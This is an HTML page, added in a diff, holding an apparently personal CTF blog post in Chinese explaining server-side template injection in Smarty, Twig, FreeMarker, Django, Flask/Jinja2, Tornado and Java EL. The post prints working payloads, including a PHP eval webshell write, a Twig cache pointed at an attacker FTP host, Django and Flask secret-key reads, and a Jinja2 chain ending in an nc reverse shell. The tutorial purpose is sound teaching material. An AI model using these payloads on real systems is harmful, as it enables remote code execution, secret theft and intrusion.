@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    SSTI理解 |  
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+<link rel="alternate" href="/atom.xml" title="Anti-Genemits" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-SSTI理解"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  SSTI理解
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/09/14/SSTI%E7%90%86%E8%A7%A3/" class="article-date">
+  <time datetime="2020-09-14T07:20:20.000Z" itemprop="datePublished">2020-09-14</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">2.4k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">10 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="一-、什么是SSTI"><a href="#一-、什么是SSTI" class="headerlink" title="一 、什么是SSTI"></a>一 、什么是SSTI</h1><h2 id="0x00-模板注入"><a href="#0x00-模板注入" class="headerlink" title="0x00 模板注入"></a>0x00 模板注入</h2><p>这是基于现在的MVC成熟的开发模式所导致的，开发者将输入通过V接收，交给C，然后由 C 调用 M 或者其他的 C 进行处理，最后再返回给 V ，这样就最终显示在我们的面前了，那么这里的 V 中就大量的用到了一种叫做<strong>模板</strong>的技术。<strong>这种模板的技术不是仅存在于Python</strong>，只要能使用模版进行开发的地方都会有这个问题，SSTI不属于任何一种的问题，沙盒绕过也不是。</p>
+<h2 id="0x01常见的模板"><a href="#0x01常见的模板" class="headerlink" title="0x01常见的模板"></a>0x01常见的模板</h2><p>PHP：Smarty，Twig（经常出题），Blade</p>
+<p>Java：JSP，FreeMarker，Velocity</p>
+<p>Python： Jinja2（常用），django，tornado</p>
+<p>tornado render() 中支持传入自定义函数，以及函数的参数，然后在两个大括号中执行</p>
+<a id="more"></a>
+
+<h2 id="0x02-漏洞形成"><a href="#0x02-漏洞形成" class="headerlink" title="0x02 漏洞形成"></a>0x02 漏洞形成</h2><p>同SQL注入，别太相信用户的输入</p>
+<h2 id="0x03-漏洞检测"><a href="#0x03-漏洞检测" class="headerlink" title="0x03 漏洞检测"></a>0x03 漏洞检测</h2><p>加payload进行输入，然后进行查看回显</p>
+<h2 id="0x04-开始攻击"><a href="#0x04-开始攻击" class="headerlink" title="0x04 开始攻击"></a>0x04 开始攻击</h2><p>1.攻击方向</p>
+<ul>
+<li>模版本身</li>
+<li>框架本身</li>
+<li>语言本身</li>
+<li>应用本身</li>
+</ul>
+<p>2.攻击方法</p>
+<ul>
+<li>模板本身支持的语法、内置变量、属性、函数，还有就是纯粹框架的全局变量、属性、函数</li>
+<li>语言本身的特性，比如 面向对象的内省机制</li>
+<li>寻找应用定义的一些东西，因为这个是几乎没有文档的，是开发者的自行设计，一般需要拿到应用的源码才能考虑</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注意：面向对象的语言中，获取父类这种思想要贯穿始终，</span><br><span class="line">理论基础：</span><br><span class="line">    Python 的魔法方法</span><br><span class="line">    PHP 的自省</span><br><span class="line">    JAVA 的反射机制</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用模板本身的特性进行攻击"><a href="#利用模板本身的特性进行攻击" class="headerlink" title="利用模板本身的特性进行攻击"></a>利用模板本身的特性进行攻击</h3><p>1.Smarty</p>
+<p>这个模版不能执行PHP中直接进行命令的函数，但是对于语言的限制并不能够影响我们执行命令。(因为没有阅读文档，所以直接从大佬文章中摘抄)。<code>$</code>+内置变量可以访问各种环境变量，比如其中self得到smarty这个类，我们就可以开始去找文档中的好方法了</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385">getStreamVariable()</a></p>
+<p>这个函数可以读文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">	&#123;self::getStreamVariable(&quot;flag.php&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16">class Smarty_Internal_Write_File</a></p>
+<p>这是一个写文件的，这个类中有一个writeFile方法， </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Smarty_Internal_Write_File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Writes file in a safe way to disk</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $_filepath complete filepath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $_contents file content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  Smarty $smarty    smarty instance</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> SmartyException</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> boolean true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params">$_filepath, $_contents, Smarty $smarty</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $_error_reporting = error_reporting();</span><br><span class="line">        error_reporting($_error_reporting &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">        <span class="keyword">if</span> ($smarty-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            $old_umask = umask(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_dirpath = dirname($_filepath);</span><br><span class="line">        <span class="comment">// if subdirs, create dir structure</span></span><br><span class="line">        <span class="keyword">if</span> ($_dirpath !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !file_exists($_dirpath)) &#123;</span><br><span class="line">            mkdir($_dirpath, $smarty-&gt;_dir_perms === <span class="literal">null</span> ? <span class="number">0777</span> : $smarty-&gt;_dir_perms, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write to tmp file, then move to overt file lock race condition</span></span><br><span class="line">        $_tmp_file = $_dirpath . DS . str_replace(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, uniqid(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));</span><br><span class="line">        <span class="keyword">if</span> (!file_put_contents($_tmp_file, $_contents)) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Windows&#x27; rename() fails if the destination exists,</span></span><br><span class="line"><span class="comment">         * Linux&#x27; rename() properly handles the overwrite.</span></span><br><span class="line"><span class="comment">         * Simply unlink()ing a file might cause other processes</span></span><br><span class="line"><span class="comment">         * currently reading that file to fail, but linux&#x27; rename()</span></span><br><span class="line"><span class="comment">         * seems to be smart enough to handle that for us.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (Smarty::$_IS_WINDOWS) &#123;</span><br><span class="line">            <span class="comment">// remove original file</span></span><br><span class="line">            <span class="keyword">if</span> (is_file($_filepath)) &#123;</span><br><span class="line">                @unlink($_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">            <span class="keyword">if</span> (!$success) &#123;</span><br><span class="line">                <span class="comment">// remove original file</span></span><br><span class="line">                <span class="keyword">if</span> (is_file($_filepath)) &#123;</span><br><span class="line">                    @unlink($_filepath);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// rename tmp file</span></span><br><span class="line">                $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$success) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_filepath&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($smarty-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// set file permissions</span></span><br><span class="line">            chmod($_filepath, $smarty-&gt;_file_perms);</span><br><span class="line">            umask($old_umask);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting($_error_reporting);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearConfig</span>(<span class="params">$varname = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Smarty_Internal_Extension_Config::clearConfig(<span class="keyword">$this</span>, $varname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,<span class="string">&quot;&lt;?php eval(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::clearConfig())&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.Twig</p>
+<p>相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 <code>self::</code> 调用静态变量了。但是可以查阅<a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/2.x/templates.html">官方文档</a></p>
+<p>Twig 给我们提供了一个 <code>_self</code>, 虽然 <code>_self</code> 本身没有什么有用的方法，但是却有一个 env。env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置(不知道为什么官方文档没有看到这个方法，后来我找到了Twig 的源码中的 environment.php</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_setCache.png"></p>
+<p>因此，明显的攻击是通过将缓存位置设置为远程服务器来引入远程文件包含漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(&quot;ftp:&#x2F;&#x2F;attacker.net:2121&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是这里就又需要我们的远程文件包含漏洞了。allow_url_include 一般是不打开的，没法包含远程文件。</p>
+<p>新的大佬又出现了:</p>
+<p> <a target="_blank" rel="noopener" href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874">getFilter()</a></p>
+<p>我们只要把exec() 作为回调函数传进去就能实现命令执行了.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3.freeMarker</p>
+<p>java模板</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br></pre></td></tr></table></figure>
+
+<p>查找文档，查看框架源码，等方式寻找这个 payload 的思路来源</p>
+<h3 id="利用框架本身的特性进行攻击"><a href="#利用框架本身的特性进行攻击" class="headerlink" title="利用框架本身的特性进行攻击"></a>利用框架本身的特性进行攻击</h3><p>1.Django</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">request, *args, **kwargs</span>):</span></span><br><span class="line">    template = <span class="string">&#x27;Hello &#123;user&#125;, This is your email: &#x27;</span> + request.GET.get(<span class="string">&#x27;email&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.format(user=request.user))</span><br></pre></td></tr></table></figure>
+
+<p>注入点很明显就是 email,但是我们能够做的事情已经被限制得很死了，很难再执行命令了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">去挖掘Django自带的应用中的一些路径，最终读取到Django的配置项</span><br></pre></td></tr></table></figure>
+
+<p>我们发现，经过翻找，我发现Django自带的应用“admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件。</p>
+<p>思路就很明确了：我们只需要通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class="line">&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.Flask/Jinja2</p>
+<p>config 是Flask模版中的一个全局对象，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。虽然config是一个类字典对象，但是通过查阅文档可以发现 config 有很多神奇的方法：<code>from_envvar</code>, <code>from_object</code>, <code>from_pyfile</code>, 以及<code>root_path</code>。这里我们利用 <code>from_pyfile</code> 和 <code>from_object</code> 来命令执行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">from_pyfile</span>(<span class="params">self, filename, silent=False</span>):</span></span><br><span class="line"></span><br><span class="line">    filename = os.path.join(self.root_path, filename)</span><br><span class="line">    d = types.ModuleType(<span class="string">&#x27;config&#x27;</span>)</span><br><span class="line">    d.__file__ = filename</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(filename) <span class="keyword">as</span> config_file:</span><br><span class="line">            exec(compile(config_file.read(), filename, <span class="string">&#x27;exec&#x27;</span>), d.__dict__)</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> silent <span class="keyword">and</span> e.errno <span class="keyword">in</span> (errno.ENOENT, errno.EISDIR):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        e.strerror = <span class="string">&#x27;Unable to load configuration file (%s)&#x27;</span> % e.strerror</span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line">    self.from_object(d)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">from_object</span>(<span class="params">self, obj</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isinstance(obj, string_types):</span><br><span class="line">        obj = import_string(obj)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> dir(obj):</span><br><span class="line">        <span class="keyword">if</span> key.isupper():</span><br><span class="line">            self[key] = getattr(obj, key)</span><br></pre></td></tr></table></figure>
+
+<p>这个方法将传入的文件使用 compile() 这个python 的内置方法将其编译成字节码(.pyc),并放到 exec() 里面去执行，注意最后一个参数 <code>d.__dict__</code>翻阅文档发现，这个参数的含义是指定 exec 执行的上下文，</p>
+<p>这个方法会遍历 Obj 的 dict 并且找到大写字母的属性，将属性的值给 self[‘属性名’]，所以说如果我们能让 from_pyfile 去读这样的一个文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from os import system</span><br><span class="line">SHELL &#x3D; system</span><br></pre></td></tr></table></figure>
+
+<p>到时候我们就能通过 config[‘SHELL’] 调用 system 方法了</p>
+<p>那么文件怎么写入呢？Jinja2 有沙盒机制，我们必须通过绕过沙盒的方式写入我们想要的文件，具体的沙盒绕过,大佬的一篇博文[python 沙盒逃逸备忘](<a target="_blank" rel="noopener" href="http://www.k0rz3n.com/2018/05/04/Python">http://www.k0rz3n.com/2018/05/04/Python</a> 沙盒逃逸备忘/)</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;evil&#39;, &#39;w&#39;).write(&#39;from os import system%0aSHELL &#x3D; system&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;写文件</span><br><span class="line">&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;evil&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;加载system</span><br><span class="line">&#123;&#123; config[&#39;SHELL&#39;](&#39;nc xxxx xx -e &#x2F;bin&#x2F;sh&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;执行命令反弹SHELL</span><br></pre></td></tr></table></figure>
+
+<p>3.Tornado</p>
+<p>我觉得除了直接阅读官方的文档，还有一个重要的方法就是直接下载 tornado 的框架源码，全局搜索 <code>需要的值</code>我特地看一下模板的对框架的语法支持(因为，<code>模板中有一些内置的对象等同于框架中的对象，但是一般为了方便书写前段就会给一个比较简单的名字</code>，就比如 JSP 的 request 内置对象实际上对应着 servlet 中的 HttpServletRequest )</p>
+<p>护网杯的easytornado，全局搜索sercet-key，然后再查看官方文档</p>
+<h4 id="2-利用模语言本身的特性进行攻击《转载》"><a href="#2-利用模语言本身的特性进行攻击《转载》" class="headerlink" title="2.利用模语言本身的特性进行攻击《转载》"></a><strong>2.利用模语言本身的特性进行攻击</strong>《转载》</h4><h5 id="1-Python"><a href="#1-Python" class="headerlink" title="1.Python"></a><strong>1.Python</strong></h5><p>Python 最最经典的就是使用魔法方法，这里就涉及到Python沙盒绕过了，前面说过，模板的设计者也发现了模板的执行命令的特性，于是就给模本增加了一种沙盒的机制，在这个沙盒中你很难执行一般我们能想到函数，基本都被禁用了，所以我们不得不使用自省的机制来绕过沙盒，具体的方法就是在大佬的[一篇博文](<a target="_blank" rel="noopener" href="http://www.k0rz3n.com/2018/05/04/Python">http://www.k0rz3n.com/2018/05/04/Python</a> 沙盒逃逸备忘/)中</p>
+<h5 id="2-JAVA"><a href="#2-JAVA" class="headerlink" title="2.JAVA"></a><strong>2.JAVA</strong></h5><p>java.lang包是java语言的核心，它提供了java中的基础类。包括基本Object类、Class类、String类、基本类型的包装类、基本的数学类等等最基本的类</p>
+<p><strong>如下图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/java.lang.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/java.lang.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
+<p>有了这个基础我们就能想到这样的payload</p>
+<p><strong>payload：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.System).getenv()&#125;</span><br><span class="line"></span><br><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="string">&#x27;cat etc/passwd&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里面的 T() 是 EL 的语法规定（比如 Spring 框架的 EL 就是 SPEL)</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2020/09/14/SSTI%E7%90%86%E8%A7%A3/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/09/13/CVE-2012-1823/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">CVE-2012-1823</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2015-2020
+        <i class="ri-heart-fill heart_icon"></i> 码农
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        Powered by Hexo
+        <span class="division">|</span>
+        Theme - <a href="https://github.com/anti-genemits" target="_blank">Anti-Genemits</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Anti-Genemits"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
